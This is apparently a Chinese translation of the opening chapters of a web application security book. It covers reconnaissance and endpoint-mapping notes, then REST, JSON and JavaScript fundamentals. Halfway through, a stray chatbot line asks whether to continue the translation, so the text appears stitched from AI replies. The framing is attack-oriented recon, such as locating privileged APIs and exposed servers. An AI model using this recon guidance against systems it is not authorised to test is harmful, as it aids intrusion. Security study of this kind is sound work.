\---

summary: 本书全面阐述现代 Web 应用安全的三大支柱（侦察、攻击与防御），涵盖从传统 Web 漏洞到云原生与零信任架构的攻防实战对策。

\---

---

# 第一部分：侦察（Part I. Recon）

在开始介绍技术层面的细节之前（这些内容在《Web 应用安全》的后续部分随处可见），我决定首先从哲学层面的概述开始。

为了高效地对 Web 应用进行漏洞利用，需要掌握广泛的技能。一方面，黑客需要了解网络协议、软件开发技术以及在各种类型的应用中发现的常见漏洞。但另一方面，黑客还需要理解他们所针对的目标应用。对目标应用的了解越透彻、越深入，攻击就会越精准、越有效。

黑客应当从功能性的角度来理解应用的设计逻辑与目的。谁是它的用户？该应用如何产生收益？用户为什么选择这个应用而不是竞争对手的产品？它的竞争对手是谁？应用中包含了哪些具体功能？

如果不从非技术角度对目标应用建立深刻的理解，实际上很难判断哪些数据和功能是核心资产。例如，对于一个用于汽车销售的 Web 应用，开发团队可能会将存储代表待售汽车的对象（价格、库存等）视为关键业务数据。但是，对于一个允许汽车爱好者发布和分享自己汽车改装信息的兴趣社区网站，其用户账户信息的价值可能要比用户个人资料中列出的改装清单高得多。

在讨论功能而非单纯的数据时，情况也是如此。许多 Web 应用通过多种方式产生收益，而不是仅仅依赖单一的收入来源。例如，一个媒体分享平台可能会提供月度订阅服务、投放广告并提供付费下载。其中哪一项对公司来说最重要？从可用性的角度来看，这些变现功能在使用上有什么不同？有多少用户为每种变现渠道贡献了收入？

归根结底，Web 应用侦察就是搜集数据并建立一个模型，将 Web 应用的技术细节和功能业务细节结合起来，以便您全面理解该应用的设计初衷与使用机制。缺乏其中任何一方面，黑客都无法精准定位他们的攻击。因此，从哲学上讲，Web 应用侦察就是对目标应用产生更深层次的理解。在这个哲学模型中，**信息是核心——无论这些信息在性质上是属于技术层面的，还是非技术层面的。**

由于这是一本技术类书籍，我们的主要精力将放在从技术角度寻找和分析 Web 应用的组件上。然而，我们也将讨论功能性分析的重要性，以及一些信息组织管理技术。除此之外，我恳请您在未来遇到侦察机会时，自主进行全面的非技术性背景研究。

---

## 第 2 章：Web 应用侦察简介

Web 应用侦察是指在对 Web 应用实施黑客攻击之前，通常进行的研究性数据搜集阶段。Web 应用侦察通常由黑客、渗透测试人员或漏洞猎人执行，但它也可以成为安全工程师在恶意行为者发现之前，找出 Web 应用中防御薄弱的机制并进行修补的有效手段。侦察（Recon）技能本身并没有太大的独立价值，但当它与攻击性黑客知识和防御性安全工程经验结合时，就会变得越来越有价值。

### 信息搜集

我们已经知道，侦察的全部目的在于在尝试攻击应用之前，对其建立深入的理解。我们也知道，侦察是优秀黑客工具箱中必不可少的一部分。但到目前为止，我们对侦察的认识仅限于此。因此，让我们开动脑筋，探讨一下侦察在技术层面上为何如此重要的更多原因。

侦察可以通过多种方式完成。有时，只需在 Web 应用中浏览并记录网络请求，就足以让您对该应用的内部工作原理了如指掌。然而，需要注意的是，并非所有的 Web 应用都拥有一个允许我们直观探索其功能的图形化用户界面（UI）。

大多数面向公众的应用（通常是面向消费者的应用，如社交媒体）都会有一个公开的 UI。然而，我们不应该假设在这种情况下我们能够访问到完整的用户界面。相反，在进行进一步调查之前，我们应该假设我们只能访问到用户界面的一个**子集（Subset）**。

让我们逻辑性地思考几分钟。当您去当地的巨型银行（MegaBank）开立一个新的银行账户（以本例中的支票账户为例）时，您通常还会收到登录凭证，允许您通过 Web 查看您的账户信息。通常，您的账户信息是由银行职员（通常是带您办理手续的柜台出纳员）手动输入的。这意味着，在某个时间点，有其他人访问了一个能够连接到银行数据库中创建新账户的 Web 应用或联网应用。

此外，如果您打电话要求您的理财经理为您开立一个新的储蓄账户，他们也会照办。通常，只要您能够提供正确的凭证以正确表明您的身份，他们就会远程完成此操作。对于大多数主流银行，这个新的储蓄账户将可以通过您支票账户已经在使用的相同登录信息进行访问。

由此我们可以推断，某些人还拥有访问另一个应用的权限，该应用允许他们编辑与您（现有的）账户相关的信息，以便将其与新创建的储蓄账户相连。它可能是用于创建您支票账户的同一个应用，也可能完全是另一个不同的应用。

接下来，您无法在线手动关闭银行账户，但您可以轻松地走进当地的分行并要求关闭您的账户。在您的请求被批准后，您的账户将很快被关闭，通常在几个小时内。

您可以通过 Web 应用访问您的银行账户来查看余额，但您通常只能使用此界面来**查看**余额。这意味着您拥有的是只读权限。

某些银行可能会允许我们在线支付账单或转账，但没有一家银行允许客户在线创建、修改或删除我们自己的账户。即使在最先进的数字银行系统中，银行客户也只拥有有限的写入权限子集。然而，银行管理员和值得信赖的工作人员确实拥有修改、创建和删除账户所需的权限。请考虑下表，其中描述了银行应用的三种不同用户：

| 用户         | 类型     | 权限                                   |
| :----------- | :------- | :------------------------------------- |
| **客户**     | 外部用户 | 登录网站。通过 Web UI 查看账户余额。   |
| **出纳员**   | 内部用户 | 在收到客户提供的纸质材料时创建新账户。 |
| **理财经理** | 内部用户 | 代表客户修改现有账户。                 |

对于一家大型银行来说，雇用研发人员为修改账户的每个操作手动创建数据库查询是不切实际的。因此，逻辑上我们可以期望他们已经编写了自动化的程序来执行这些操作，即使我们（外部用户）无法直接访问它。

大多数实现数据访问自动化的应用都使用分级的用户权限结构。我们称这种具有权限结构的应用为**基于角色的访问控制（Role-Based Access Control，RBAC）**应用。如今，极少有应用对所有用户仅使用单一级别的权限。

您可能在自己使用过的软件中看到过这些控制措施；例如，在您的操作系统上调用危险命令可能会提示您输入管理员凭证。或者，许多社交媒体网站都设有版主（Moderator），他们的权限级别高于普通用户，但通常低于管理员（Admin）。

如果我们仅通过浏览 Web 应用的 UI，我们可能永远不会知道那些旨在供这些高级权限用户（如管理员、版主等）使用的 API 端点。但如果掌握了 Web 应用侦察技术，我们通常可以找到这些 API。我们甚至可以构建一个复杂的映射图，详细记录管理员或版主的完整权限，以便我们可以将其与为普通用户设置的权限进行比较。偶尔，我们可能会发现一些安全缺陷，允许非特权用户利用专为更高级特权用户设计的功能。

侦察技能还可以用于搜集我们字面上无法访问的应用的信息。这可能是学校的内部网络或公司可通过网络访问的文件服务器。如果我们具备对应用 API 的结构及其接受的 Payload 进行逆向工程的适当技能，我们就不需要用户界面来了解应用是如何运行的。

有时，在您进行侦察时，您实际上会遇到完全没有受到保护的服务器或 API。许多公司依赖多个服务器（包括内部和外部服务器）。仅仅忘记配置单行网络或防火墙规则，就可能导致一个原本应该被限制在内部网络中的 HTTP 服务器暴露在公共网络上。

随着您逐步构建出 Web 应用的技术和架构图，您也将能够更好地确定攻击的优先级。您将了解应用的哪些部分防御最严密，以及哪些部分可以作为突破口。

---

### Web 应用拓扑映射

随着我们在第一部分中的深入，您将学习如何构建一个代表 Web 应用结构、组织和功能的拓扑映射图。这通常应该是您在尝试攻击 Web 应用之前采取的第一步。随着您在 Web 应用侦察方面变得更加熟练，您将开发出自己的技术以及记录和组织所发现信息的方法。

对于许多人来说，地形观测点的有序集合被称为地图。地形学（Topography）一词意味着对土地特征、形状和表面的研究。Web 应用也有特征、形状和表面。这些与您在大自然中发现的截然不同，但许多相同的概念同样适用。我们将在这里使用“地图（Map）”一词来定义收集到的关于应用代码、网络结构和功能集的数据点。您将在接下来的几章中学习如何获取填充映射图所需的数据。

根据您正在测试的应用的复杂度以及您打算对其进行测试的持续时间，您可能只需要将您的映射图存储在简单的草稿纸或临时笔记中。对于更庞大的应用，或者您打算长期且频繁测试的应用，您可能需要一个更强大的解决方案。您选择如何构建自己的映射图最终取决于您自己——只要它易于检索并能够存储相关信息和关联关系，任何格式都足够。

就我个人而言，我更喜欢在大多数笔记中使用类似于 **JavaScript （JSON）** 的格式。我发现分层的数据结构在 Web 应用中非常常见，它们还可以让我更轻松地对笔记进行分类和搜索。

以下是一个 JSON 风格的侦察笔记示例，描述了在 Web 应用的 API 服务器中发现的一组 API 端点：

```json
{
 "api_endpoints": {
   "sign_up": {
     "url": "mywebsite.com/auth/sign_up",
     "method": "POST",
     "shape": {
       "username": { "type": "String", "required": true, "min": 6, "max": 18 },
       "password": { "type": "String", "required": true, "min": 6, "max": 32 },
       "referralCode": { "type": "String", "required": false, "min": 64, "max": 64 }
     }
   },
   "sign_in": {
     "url": "mywebsite.com/auth/sign_in",
     "method": "POST",
     "shape": {
       "username": { "type": "String", "required": true, "min": 6, "max": 18 },
       "password": { "type": "String", "required": true, "min": 6, "max": 32 }
     }
   },
   "reset_password": {
     "url": "mywebsite.com/auth/reset",
     "method": "POST",
     "shape": {
       "username": { "type": "String", "required": true, "min": 6, "max": 18 },
       "password": { "type": "String", "required": true, "min": 6, "max": 32 },
       "newPassword": { "type": "String", "required": true, "min": 6, "max": 32 }
     }
   }
 },
 "features": {
   "comments": {},
   "uploads": {
     "file_sharing": {}
   }
 },
 "integrations": {
   "oauth": {
     "twitter": {},
     "facebook": {},
     "youtube": {}
   }
 }
}
```

像 Notion 这样的分层笔记软件，或者像 XMind 这样的思维导图软件，也是记录和组织您通过侦察尝试所学到知识的极好工具。最终，您需要找到一种最适合您的方法，让您保持条理，同时足够强大，以便在需要时扩展到简单的应用之外。

### 本章总结

侦察技术对于深入理解 Web 应用的技术和结构以及驱动该 Web 应用的服务非常有价值。除了能够对 Web 应用执行侦察之外，我们还必须密切关注我们的发现，并以足够条理化的方式记录它们，以便日后轻松查阅。

本章中介绍的 JSON 风格笔记描述了我自己在记录针对 Web 应用的侦察工作时首选的笔记风格。然而，侦察笔记记录中最重要的方面是**保留关联关系和层级结构**，同时仍保持笔记易于阅读和手动检索。

您必须找到一种适合您并且可以从小型应用扩展到大型应用的文档记录风格。如果您发现另一种更适合您的风格或格式，那就使用它；笔记的内容和结构远比存储它们的软件或格式重要。

---

## 第 3 章：现代 Web 应用的结构

在您为了侦察目的而有效评估 Web 应用之前，最好先了解许多 Web 应用作为依赖项所共享的常见技术。这些依赖项涵盖了从 JavaScript 辅助库和预定义的 CSS 模块，一直到 Web 服务器甚至操作系统。通过理解这些依赖项的角色以及它们在应用技术栈中的常见实现，快速识别它们并寻找配置错误（Misconfiguration）会变得容易得多。

### 现代与传统 Web 应用的对比

当今的 Web 应用通常构建在 10 年前还不存在的技术之上。在那个时间范围内，用于构建 Web 应用的可用工具已经先进了如此之多，以至于有时在今天看来它完全是一个不同的专业领域。

十年前，大多数 Web 应用是使用服务端框架构建的，这些框架渲染一个 HTML/JS/CSS 页面，然后该页面将被发送到客户端。在需要更新时，客户端只需向服务器请求另一个要渲染并通过 HTTP 传输的页面。在此之后不久，随着 **AJAX（Asynchronous JavaScript and XML，异步 JavaScript 和 XML）**的崛起，Web 应用开始更频繁地使用 HTTP，从而允许通过 JavaScript 在页面会话内部发起网络请求。

今天，许多应用实际上更准确地表现为通过网络协议进行通信的两个或多个应用，而不是单个单体应用（Monolithic Application）。这是当今的 Web 应用与十年前的 Web 应用之间的一个重大架构差异。

通常，当今的 Web 应用由通过**表征状态转移（REST）API** 连接的几个应用组成。这些 API 是无状态的，仅用于满足从一个应用到另一个应用的请求。这意味着它们实际上并不存储关于请求者的任何信息。

当今的许多客户端（UI）应用在浏览器中运行，其方式更类似于传统的桌面应用。这些客户端应用管理它们自己的生命周期循环、请求它们自己的数据，并且在初始引导（Bootstrap）完成后不需要重新加载页面。

部署到 Web 浏览器的独立应用与众多服务器进行通信并不少见。考虑一个允许用户登录的图片托管应用——它很可能拥有一个位于某个 URL 的专用托管/分发服务器，以及一个用于管理数据库和登录的独立 URL。

可以安全地说，当今的应用通常实际上是协同工作的许多独立但共生的应用的组合。这可以归因于定义更清晰的网络协议和 API 架构模式的发展。

一个典型的现代 Web 应用可能会使用以下几种技术：

* REST API
* JSON 或 XML
* JavaScript
* SPA 框架（ReactJS、VueJS、EmberJS、AngularJS）
* 身份验证与授权系统
* 一个或多个 Web 服务器（通常运行在 Linux 服务器上）
* 一个或多个 Web 服务器软件套件（ExpressJS、Apache、NGINX）
* 一个或多个数据库（MySQL、MongoDB 等）
* 客户端上的本地数据存储（Cookie、Web 存储、IndexedDB）

其中一些技术在十年前就已经存在，但如果说它们在那个时间范围内没有发生变化是不公平的。数据库已经存在了数十年，但 NoSQL 数据库和客户端数据库绝对是最近才发展起来的。

在 Node.js 和 npm 开始获得迅速采用之前，全栈 JavaScript 应用的开发也是不可能的。在过去的十年左右的时间里，Web 应用的格局发生着如此迅速的变化，以至于其中许多技术已经从不为人知变得无处不在。

地平线上甚至出现了更多的技术：例如，用于在本地存储请求的 Cache API，以及作为客户端到服务端（甚至客户端到客户端）通信的替代网络协议的 WebSockets。最终，浏览器打算完全支持一种被称为 WebAssembly 的汇编代码变体，这将允许在浏览器中使用非 JavaScript 语言来编写客户端代码。

这些全新的和即将到来的技术中的每一项都带来了全新的安全漏洞，可以被发现并用于造福或行恶。对于从事漏洞利用或保障 Web 应用安全业务的人来说，这是一个令人兴奋的时代。

不幸的是，我无法解释当今 Web 上使用的每一项技术——那需要专门写一本书！但本章的其余部分将对前面列出的技术进行介绍。对于您尚不十分熟悉的技术，您可以重点阅读。

---

### REST API

REST 代表**表征状态转移（Representational State Transfer）**，这是一种定义具有以下几个独特特征的 API 的新颖方式：

它必须与客户端分离

REST API 旨在构建高度可扩展但简单的 Web 应用。将客户端与 API 分离，同时遵循严格的 API 结构，使得客户端应用能够轻松地向 API 请求资源，而无需能够直接调用数据库或自行执行服务端逻辑。

它必须是无状态的

根据设计，REST API 仅接收输入并提供输出。API 不得存储任何关于客户端连接的状态。然而，这并不意味着 REST API 无法执行身份验证（Authentication）和授权（Authorization）——相反，授权应该是令牌化（Tokenized）的，并在每次请求中发送。

它必须是易于缓存的

为了妥善扩展通过互联网交付的 Web 应用，REST API 必须能够轻松地将其响应标记为可缓存或不可缓存。因为 REST 还在哪些数据将从哪个端点提供方面有着非常严格的定义，这在设计合理的 REST API 上实际上非常容易配置。理想情况下，缓存应该通过程序进行管理，以免意外向另一个用户泄漏特权信息。

每个端点应该定义一个特定的对象或方法

通常，这些端点是按层级定义的；例如，`/moderators/joe/logs/12_21_2018`。通过这种方式，REST API 可以轻松利用 HTTP 动词，如 GET、POST、PUT 和 DELETE。因此，一个具有多个 HTTP 动词的端点本身就具有自文档化（Self-documenting）的特性。

您想修改版主账户“joe”吗？使用 `PUT /moderators/joe`。
想删除 2018 年 12 月 21 日的日志吗？只需进行简单的推导：`DELETE /moderators/joe/logs/12_21_2018`。

因为 REST API 遵循定义明确的架构模式，像 Swagger 这样的工具可以轻松地集成到应用中并对端点进行文档化，从而使其他开发人员更容易理解端点的意图。

过去，大多数 Web 应用使用**简单对象访问协议（Simple Object Access Protocol，SOAP）**结构的 API。相比 SOAP，REST 具有以下几个优势：

* 请求针对的是数据，而不是函数
* 易于对请求进行缓存
* 高度可扩展

此外，虽然 SOAP API 必须使用 XML 作为其传输数据格式，但 REST API 可以接受任何数据格式，不过通常使用 JSON。JSON 比 XML 轻量得多（不那么冗长），且更易于人类阅读，这也使 REST 在竞争中占得先机。

以下是一个用 XML 编写的 Payload 示例：

```xml
<user>
<username>joe</username>
<password>correcthorsebatterystaple</password>
<email>joe@website.com</email>
<joined>12/21/2005</joined>
<client-data>
 <timezone>UTF</timezone>
 <operating-system>Windows 10</operating-system>
 <licenses>
 <videoEditor>abc123-2005</videoEditor>
 <imageEditor>123-456-789</imageEditor>
 </licenses>
</client-data>
</user>
```

与之类似，相同的 Payload 用 JSON 编写如下：

```json
{
"username": "joe",
"password": "correcthorsebatterystaple",
"email": "joe@website.com",
"joined": "12/21/2005",
"client-data": {
 "timezone": "UTF",
 "operating-system": "Windows 10",
 "licenses": {
 "videoEditor": "abc123-2005",
 "imageEditor": "123-456-789"
 }
}
}
```

您遇到的大多数现代 Web 应用要么使用 RESTful API，要么使用提供 JSON 的类 REST（REST-like）API。在维持这种严苛设计以实现向下兼容的特定企业级应用之外，遇到 SOAP API 和 XML 的情况正变得越来越罕见。

当您尝试对 Web 应用的 API 层进行逆向工程时，理解 REST API 的结构至关重要。掌握 REST API 的基本原理将使您处于优势地位，因为您会发现许多想要调查的 API 都遵循 REST 架构——但此外，许多您想要使用或与之集成工作流的工具也将通过 REST API 暴露出来。

---

### JavaScript 对象（JSON）

REST 是一种架构规范，它定义了 HTTP 动词应该如何映射到服务器上的资源（API 端点和功能）。如今，大多数 REST API 使用 JSON 作为其传输数据格式。

思考一下：应用的 API 服务器必须与其客户端（通常是浏览器或移动应用中的某些代码）进行通信。如果没有客户端/服务器关系，我们就无法实现跨设备存储状态并在账户之间持久化该状态。所有的状态都必须存储在本地。

因为现代 Web 应用需要大量的客户端/服务器通信（用于数据的下行交换和 HTTP 动词形式的上行请求），因此以临时（Ad hoc）格式发送数据是不可行的。数据的传输格式必须标准化。

JSON 是解决这个问题的一个潜在方案。JSON 是一种满足许多有趣要求的开放标准（非专有）文件格式：

* 它非常轻量（减少网络带宽占用）。
* 它需要极少的解析（减轻服务器/客户端硬件负载）。
* 它易于人类阅读。
* 它是分层的（可以表示数据之间的复杂关系）。
* JSON 对象的表示方式与 JavaScript 对象非常相似，这使得在浏览器中解析 JSON 以及构建新的 JSON 对象变得非常容易。

如今所有主流浏览器都原生（且快速地！）支持 JSON 的解析，除了前述的几点之外，这也使得 JSON 成为在无状态服务器和 Web 浏览器之间传输数据的极佳格式。

以下 JSON 数据：

```json
{
"first": "Sam",
"last": "Adams",
"email": "sam.adams@company.com",
"role": "Engineering Manager",
"company": "TechCo.",
"location": {
 "country": "USA",
 "state": "california",
 "address": "123 main st.",
 "zip": 98404
 }
}
```

可以在浏览器中轻松解析为 JavaScript 对象：

```javascript
const jsonString = `{
 "first": "Sam",
 "last": "Adams",
 "email": "sam.adams@company.com",
 "role": "Engineering Manager",
 "company": "TechCo.",
 "location": {
 "country": "USA",
 "state": "california",
 "address": "123 main st.",
 "zip": 98404
 }
}`;
// convert the string sent by the server to an object
const jsonObject = JSON.parse(jsonString);
```

JSON 灵活、轻量且易于使用。它并非没有缺点，因为与重量级替代方案相比，任何轻量级格式都有其权衡取舍。这些内容将在本书后面评估 JSON 与其竞争对手之间的特定安全差异时进行讨论，但目前只需理解，今天浏览器和服务器之间的大量网络请求都是作为 JSON 发送的。

请熟悉阅读 JSON 字符串，并考虑在您的浏览器或代码编辑器中安装一个插件来格式化 JSON 字符串。在短时间内对各种 API 进行渗透测试时，能够快速解析这些字符串并找到特定键（Key）将是非常有价值的。

---

### JavaScript

在整本书中，我们将不断讨论客户端和服务端应用。**服务端（Server）**是一台驻留在数据中心（有时称为云）中的计算机（通常是性能强大的计算机），负责处理对网站的请求。有时，这些服务器实际上是许多服务器组成的集群；其他时候，它可能只是一个用于开发或日志记录的轻量级服务器。

相反，**客户端（Client）**是用户可以访问并用于操作 Web 应用的任何设备。通常，这些界面是 HTML、CSS 和 JavaScript，但也可以是移动电话、商场里的互动终端，甚至是电动汽车上的触摸屏——但就我们的目的而言，它通常只是一个 Web 浏览器。

服务器可以配置为运行您能想象到的几乎任何软件，使用您能想象到的任何语言。如今的 Web 服务器运行在 Python、Java、JavaScript（JS）、C++ 等语言上。而客户端（特别是浏览器）则没有这种选择。JavaScript 是一种动态编程语言，最初设计用于互联网浏览器。JavaScript 不仅是一种编程语言，也是 Web 浏览器中进行客户端脚本编写的唯一编程语言。JavaScript 现在已应用于许多领域，从移动设备到物联网（IoT）。

本书中的许多代码示例都是用 JavaScript 编写的。在可能的情况下，后端代码示例也使用 JavaScript 语法编写，这样就不会在上下文切换中浪费时间。我会尽量保持 JavaScript 代码的干净整洁和简单，但我可能会使用一些 JavaScript 支持但在其他语言中不那么流行（或广为人知）的结构。

JavaScript 是一种独特的语言，因为它的开发与浏览器的发展及其合作伙伴——**文档对象模型（Document Object Model，DOM）**紧密相连。正因为如此，在继续前进之前，您可能需要了解一些奇特之处。

#### 变量与作用域

在 ES6 JavaScript（一个较近的版本）中，有四种定义变量的方法：

```javascript
// global definition
age = 25;
// function scoped
var age = 25;
// block scoped
let age = 25;
// block scoped, without reassignment
const age = 25;
```

这些看起来可能很相似，但它们在功能上却大不相同。

如果不使用 `var`、`let` 或 `const` 等关键字，您定义的任何变量都将被提升到全局作用域（Global Scope）中。这意味着作为全局作用域子级定义的任何其他对象都将能够访问该变量。通常，这被认为是一种坏习惯，我们应该远离它。（它也可能是导致重大安全漏洞或功能性 Bug 的根源。）

请注意，所有缺少 `var`、`let` 或 `const` 的变量也会在浏览器的 `window` 对象上添加一个指针：

```javascript
// define global integer
age = 25;
// direct call (returns 25)
console.log(age);
// call via pointer on window (returns 25)
console.log(window.age);
```

当然，这可能会在 `window`（浏览器 DOM 赖以维护窗口状态的对象）上引起命名空间冲突，这是避免它的另一个好理由。

使用标识符 `var` 定义的任何变量其作用域都被限制在最近的函数中，如果没有定义外部函数块，则是全局的（在全局情况下，它会像前面展示的无标识符变量一样出现在 `window` 上）。

这种类型的变量有点令人困惑，这可能也是最终引入 `let` 的部分原因。

```javascript
const func = function() {
if (true) {
 // define age inside of if block
 var age = 25;
}
/*
 * logging age will return 25
 *
 * this happens because the var identifier binds to the nearest
 * function, rather than the nearest block.
 */
console.log(age);
};
```

在前面的示例中，使用 `var` 标识符定义了一个值为 25 的变量。在大多数其他现代编程语言中，尝试打印 `age` 时它将是未定义的（Undefined）。不幸的是，`var` 不遵循这些通用规则，而是将自己限制在函数作用域而不是块作用域中。这可能会引导新的 JavaScript 开发人员走向充满调试困惑的深渊。

ECMAScript 6（JavaScript 的一个规范）引入了 `let` 和 `const`——这两种实例化对象的方法与在其他现代语言中的表现更为相似。

正如您所期望的，`let` 是块级作用域（Block Scoped）。这意味着：

```javascript
const func = function() {
if (true) {
 // define age inside of if block
 let age = 25;
}
/*
 * This time, console.log(age) will return `undefined`.
 *
 * This is because `let`, unlike `var`, binds to the nearest block.
 * Binding scope to the nearest block rather than the nearest function
 * is generally considered to be better for readability, and
 * results in a reduction of scope-related bugs.
 */
console.log(age);
};
```

`const` 与 `let` 非常相似，也是块级作用域，但它不能被重新赋值。这使得它类似于 Java 等语言中的 `final` 变量：

```javascript
const func = function() {
 const age = 25;
 /*
 * This will result in: TypeError: invalid assignment to const `age`
 *
 * Much like `let`, `const` is block scoped.
 * The major difference is that `const` variables do not support
 * reassignment after they are instantiated.
 *
 * If an object is declared as a const, its properties can still be
 * changed. As a result, `const` ensures the pointer to `age` in memory
 * is not changed, but does not care if the value of `age` or a property
 * on `age` changes.
 */
 age = 25;
};
```

通常，您应该始终争取在代码中使用 `let` 和 `const`，以避免 Bug 并提高可读性。

---

#### 函数

在 JavaScript 中，函数是对象（Object）。这意味着它们可以使用上一节中的变量和标识符进行赋值和重新赋值。

这些全都是函数：

```javascript
// anonymous function
function() {};
// globally declared named function
a = function() {};
// function scoped named function
var a = function() { };
// block scoped named function
let a = function() {};
// block scoped named function without reassignment
const a = function() {};
// anonymous function inheriting parent context
() => {};
// immediately invoked function expression (IIFE)
(function() { })();
```

第一个函数是**匿名函数（Anonymous Function）**——这意味着它在创建后无法被引用。接下来的四个仅仅是根据所提供的标识符指定了作用域的函数。这与我们之前为 `age` 创建变量非常相似。第六个函数是**箭头函数（Shorthand Function）**——它与其父级共享上下文（稍后会详细介绍）。

最后一个函数是您可能只在 JavaScript 中才能找到的特殊类型函数，称为 **IIFE（Immediately Invoked Function Expression，立即调用函数表达式）**。这是一个在加载时立即触发并在其自己的命名空间内运行的函数。更高级的 JavaScript 开发人员使用这些函数来封装代码块，防止它们被其他地方访问。

---

**请问您需要我继续输出下一段译文吗？如果需要，请回复“继续”。**

以下是第 3 章接下来的内容，涵盖 **上下文（Context）**、**原型继承（Prototypal Inheritance）** 以及 **异步（Asynchrony）** 的完整中文翻译。

---

#### 上下文

如果您能够使用任何其他非 JavaScript 语言编写代码，那么要成为一名优秀的 JavaScript 开发人员，您只需要学习以下五件事：作用域（Scope）、上下文（Context）、原型继承（Prototypal Inheritance）、异步（Asynchrony）以及浏览器 DOM。

JavaScript 中的每个函数都有其自己的一组属性和附加其上的数据。我们称这些为函数的**上下文（Context）**。上下文并非一成不变，可以在运行时（Runtime）进行修改。存储在函数上下文中的对象可以使用关键字 `this` 进行引用：

```javascript
const func = function() {
 this.age = 25;
 // will return 25
 console.log(this.age);
};
// will return undefined
console.log(this.age);
```

可以想象，许多令人恼火的程序 Bug 都是因为上下文难以调试而导致的——特别是当某些对象的上下文必须传递给另一个函数时。JavaScript 引入了几种解决方案来帮助开发人员在函数之间共享上下文：

```javascript
// create a new getAge() function clone with the context from ageData
// then call it with the param 'joe'
const getBoundAge = getAge.bind(ageData)('joe');

// call getAge() with ageData context and param joe
const boundAge = getAge.call(ageData, 'joe');

// call getAge() with ageData context and param joe
const boundAge = getAge.apply(ageData, ['joe']);
```

这三个函数：`bind`、`call` 和 `apply`，允许开发人员将上下文从一个函数移动到另一个函数。`call` 和 `apply` 的唯一区别在于：`call` 接收一个参数列表，而 `apply` 接收一个参数数组。

这两者可以很容易地相互替换：

```javascript
// destructure array into list
const boundAge = getAge.call(ageData, ...['joe']);
```

另一个用于辅助程序员管理上下文的新增功能是**箭头函数（Arrow Function）**，也称为简写函数。此函数继承其父级的上下文，从而允许在不进行显式 `call` / `apply` 或 `bind` 的情况下，在父函数与子函数之间共享上下文：

```javascript
// global context
this.garlic = false;

// soup recipe
const soup = { garlic: true };

// standard function attached to soup object
soup.hasGarlic1 = function() { console.log(this.garlic); } // true

// arrow function attached to global context
soup.hasGarlic2 = () => { console.log(this.garlic); } // false
```

掌握这些管理上下文的方法，将使通过基于 JavaScript 的服务端或客户端进行的侦察工作变得更加轻松和快速。您甚至可能会发现一些由于这些复杂性而产生的语言特有的漏洞。

---

#### 原型继承

与许多建议使用基于类的继承（Class-Based Inheritance）模型的传统服务端语言不同，JavaScript 被设计为具有高度灵活性的**原型继承（Prototypal Inheritance）**系统。不幸的是，因为很少有语言使用这种类型的继承系统，它经常被开发人员忽视，他们中的许多人试图将其转换为基于类的系统。

在基于类的系统中，类（Class）就像定义对象的蓝图（Blueprint）。在这样的系统中，类可以从其他类继承，并以这种方式创建层次关系。在像 Java 这样的语言中，子类是使用 `extends` 关键字生成或使用 `new` 关键字进行实例化的。

JavaScript 并不真正支持这些类型的类，但由于原型继承非常灵活，因此可以通过在 JavaScript 的原型系统之上进行一些抽象来模拟类的精确功能。在像 JavaScript 这样的原型继承系统中，创建的任何对象都有一个附加在其上的名为 `prototype` 的属性。`prototype` 属性带有一个附加的 `constructor` 属性，该属性指向拥有该原型的函数。这意味着任何对象都可以用于实例化新对象，因为 `constructor` 指向包含该原型的对象，而该原型又包含该构造函数。

这可能会令人困惑，但这里有一个示例：

```javascript
/*
 * A vehicle pseudoclass written in JavaScript.
 *
 * This is simple on purpose, in order to more clearly demonstrate
 * prototypal inheritance fundamentals.
 */
const Vehicle = function(make, model) {
this.make = make;
this.model = model;
this.print = function() {
 return `${this.make}: ${this.model}`;
};
};
const prius = new Vehicle('Toyota', 'Prius');
console.log(prius.print());
```

当在 JavaScript 中创建一个新对象时，还会创建一个名为 `__proto__` 的单独对象。该对象指向在创建该对象期间调用了其构造函数的原型（Prototype）。这允许在对象之间进行比较，例如：

```javascript
const prius = new Vehicle('Toyota', 'Prius');
const charger = new Vehicle('Dodge', 'Charger');
/*
 * As we can see, the "Prius" and "Charger" objects were both
 * created based off of "Vehicle".
 */
prius.__proto__ === charger.__proto__;
```

通常，对象上的原型会被开发人员修改，从而导致 Web 应用功能发生令人困惑的变化。最值得注意的是，因为 JavaScript 中的所有对象默认都是可变的（Mutable），所以在运行时的任何时候都可能发生对原型属性的更改。

有趣的是，这意味着与设计更严苛的继承模型不同，JavaScript 继承树可以在运行时发生变化。因此，对象可以在运行时发生变形：

```javascript
const prius = new Vehicle('Toyota', 'Prius');
const charger = new Vehicle('Dodge', 'Charger');
/*
 * This will fail because the Vehicle object
 * does not have a "getMaxSpeed" function.
 *
 * Hence, objects inheriting from Vehicle do not have such a function
 * either.
 */
console.log(prius.getmaxSpeed()); // Error: getMaxSpeed is not a function

/*
 * Now we will assign a getMaxSpeed() function to the prototype of Vehicle,
 * all objects inheriting from Vehicle will be updated in real time as
 * prototypes propagate from the Vehicle object to its children.
 */
 Vehicle.prototype.getMaxSpeed = function() {
 return 100; // mph
 };
 /*
 * Because the Vehicle's prototype has been updated, the
 * getMaxSpeed function will now function on all child objects.
 */
 prius.getMaxSpeed(); // 100
 charger.getMaxSpeed(); // 100
```

原型需要一段时间才能适应，但最终它们在学习曲线中展现出的威力和灵活性会超过任何困难。在深入研究 JavaScript 安全时，理解原型尤其重要，因为很少有开发人员完全理解它们。

此外，因为原型在修改时会传播到子级，所以在基于 JavaScript 的系统中发现了一种特殊类型的攻击，称为**原型链污染（Prototype Pollution）**。这种攻击涉及对父级 JavaScript 对象的修改，这会无意中改变子级对象的功能。

---

#### 异步

**异步（Asynchrony）**是网络编程中经常出现的那些“难以琢磨、一学就会”的概念之一。因为浏览器必须定期与服务器进行通信，并且请求和响应之间的时间是非标准的（考虑到 Payload 大小、延迟以及服务器处理时间），所以 Web 上经常使用异步来处理这种变化。

在同步编程（Synchronous Programming）模型中，操作按照它们发生的顺序执行。例如：

```javascript
console.log('a');
console.log('b');
console.log('c');
// a
// b
// c
```

在前面的情况中，操作按顺序发生，每次这些函数以相同的顺序调用时，都会可靠地输出“abc”。

在异步编程模型中，解释器每次可能会以相同的顺序读取这三个函数，但它们可能不会以相同的顺序解析。思考这个例子，它依赖于一个异步记录日志函数：

```javascript
// --- Attempt #1 ---
async.log('a');
async.log('b');
async.log('c');
// a
// b
// c

// --- Attempt #2 ---
async.log('a');
async.log('b');
async.log('c');
// a
// c
// b

// --- Attempt #3 ---
async.log('a');
async.log('b');
async.log('c');
// a
// b
// c
```

